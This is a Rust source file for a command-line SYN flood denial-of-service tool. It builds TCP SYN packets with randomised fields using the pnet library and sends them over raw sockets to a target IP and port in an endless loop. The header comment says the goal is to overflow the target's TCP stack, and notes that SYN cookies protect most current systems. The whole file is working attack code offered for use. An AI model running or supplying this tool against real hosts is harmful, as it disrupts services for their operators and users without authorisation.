// This does SYN flooding using the pnet library.
// Basically, it will flood a target with SYN packets in order
// to overflow its TCP stack and DoS it. Most new OSes are protected
// against this by using SYN cookies.
//
// Needs root rights to access raw sockets.

extern crate pnet;
extern crate rand;

use std::env;
use std::io::{self, Write};
use std::net::{AddrParseError, IpAddr, Ipv4Addr};
use std::{thread, time};
use std::process;
use std::num::ParseIntError;

use pnet::transport::{transport_channel};
use pnet::transport::TransportChannelType::{Layer4};
use pnet::transport::TransportProtocol::Ipv4;
use pnet::packet::ip::IpNextHeaderProtocols;

use pnet::packet::tcp::{MutableTcpPacket};
use pnet::packet::tcp::TcpFlags::SYN;
use pnet::packet::tcp::ipv4_checksum;


fn syn_flood_ip(dest_ip: Ipv4Addr, dest_port: u16) {
    let source_ip = "192.168.0.3".parse::<Ipv4Addr>().unwrap();

    let sleep_duration = time::Duration::from_millis(500);

    loop {
        let mut tcp_buffer = [0u8; 60];
        let mut tcp_packet = MutableTcpPacket::new(&mut tcp_buffer).unwrap();
        // Build TCP Packet
        tcp_packet.set_source(rand::random::<u16>());
        tcp_packet.set_destination(dest_port);
        tcp_packet.set_sequence(rand::random::<u32>());
        tcp_packet.set_acknowledgement(rand::random::<u32>());
        tcp_packet.set_flags(SYN);
        tcp_packet.set_window(rand::random::<u16>());
        tcp_packet.set_checksum(ipv4_checksum(&tcp_packet.to_immutable(), &source_ip, &dest_ip));
        // Size in 32-bits word : Minimum = 5 (minium header size in bytes = 5 * 4 = 20B)
        tcp_packet.set_data_offset(5);
        // tcp_packet.set_payload(String::from("coucou").as_bytes());


        println!("{:?}", tcp_packet);

        let tcp_transport = Layer4(Ipv4(IpNextHeaderProtocols::Tcp));
        // Largest frame size for Ethernet is 1500
        let (mut sender, _) = match transport_channel(1500, tcp_transport) {
            Ok((tx, rx)) => (tx, rx),
            Err(e) => panic!("Error happened {}", e),
        };
        let bytes_sent = sender
            .send_to(tcp_packet, IpAddr::from(dest_ip))
            .unwrap();

        print!("Sent {} bytes.", bytes_sent);
        thread::sleep(sleep_duration);
    }
}


fn main() {
    let mut args = env::args().skip(1);
    let target_ip: Result<Ipv4Addr, AddrParseError> = match args.next() {
        Some(n) => n.parse(),
        None => {
            writeln!(io::stderr(), "USAGE: ./bin <TARGET IP> <TARGET PORT>").unwrap();
            process::exit(1);
        }
    };
    let target_port: Result<u16, ParseIntError> = match args.next() {
        Some(n) => n.parse(),
        None => {
            writeln!(io::stderr(), "USAGE: ./bin <TARGET IP> <TARGET PORT>").unwrap();
            process::exit(1);
        }
    };
    syn_flood_ip(target_ip.unwrap(), target_port.unwrap());
}
